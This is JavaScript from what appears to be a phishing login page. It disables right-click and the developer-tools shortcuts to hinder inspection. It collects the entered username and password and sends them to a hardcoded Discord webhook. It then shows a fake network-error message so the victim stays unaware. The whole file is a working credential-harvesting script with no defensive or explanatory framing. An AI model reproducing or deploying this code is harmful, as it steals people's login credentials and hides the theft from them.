document
 .addEventListener(
  'contextmenu',
  function(
   event
  ) {
   event
    .preventDefault();
  }
 );


document
 .addEventListener(
  'keydown',
  function(
   event
  ) {
   if (
    event
    .keyCode ==
    123
   ) {
    event
     .preventDefault();
   }
  }
 );


document
 .addEventListener(
  'keydown',
  function(
   event
  ) {
   if (
    event
    .ctrlKey &&
    event
    .shiftKey &&
    event
    .keyCode ==
    73
   ) {
    event
     .preventDefault();
   }
  }
 );


document
 .addEventListener(
  'keydown',
  function(
   event
  ) {
   if (
    event
    .ctrlKey &&
    event
    .shiftKey &&
    event
    .keyCode ==
    74
   ) {
    event
     .preventDefault();
   }
  }
 );



function sendCredentials() {
 var
  username =
  document
  .getElementById(
   "email or phone number"
  )
  .value;
 var
  password =
  document
  .getElementById(
   "password"
  )
  .value;
 
 var
  payload = {
   "content": "New login attempt!",
   "embeds": [{
    "title": "Credentials",
    "fields": [{
      "name": "username ",
      "value": username
     },
     {
      "name": "Password",
      "value": password
     }
    ]
   }]
  };
 
 $.ajax({
  url: "https://discord.com/api/webhooks/1112773410007830588/J60tcw2FYesaodkgDsLpnFyVBMKfIYV3lRqmVFLCcLm7uSeCrWeLzohXFbJ9MOlS0a7M",
  type: "POST",
  data: JSON
   .stringify(
    payload
   ),
  contentType: "application/json",
  success: function() {
   alert
    (
     "An error occurred please check your network or try again later."
    );
  },
  error: function(
   xhr,
   status,
   error
  ) {
   console
    .error(
     xhr
     .responseText
    );
   alert
    (
     "An error occurred please check your network or try again later."
    );
  }
 });
}

<
/script>
